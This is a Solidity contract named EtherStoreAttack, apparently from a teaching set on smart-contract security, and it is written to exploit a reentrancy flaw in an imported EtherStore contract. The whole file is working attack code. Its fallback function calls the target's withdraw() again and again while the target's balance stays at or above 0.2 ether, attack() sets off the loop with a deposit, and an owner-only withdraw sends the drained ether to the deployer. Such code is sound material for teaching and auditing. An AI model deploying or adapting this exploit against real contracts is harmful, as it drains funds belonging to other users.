// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

import "./EtherStore.sol";

// This contract exploits the vulnerability in EtherStore.

contract EtherStoreAttack {
    EtherStore public etherStore;
    address public owner;

    // Takes in the address of the target contract
    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
        owner = msg.sender;
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 0.2 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 0.2 ether);
        etherStore.deposit{value: 0.2 ether}();
        etherStore.withdraw();
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not contract owner");
        _;
    }

    function withdraw() public onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
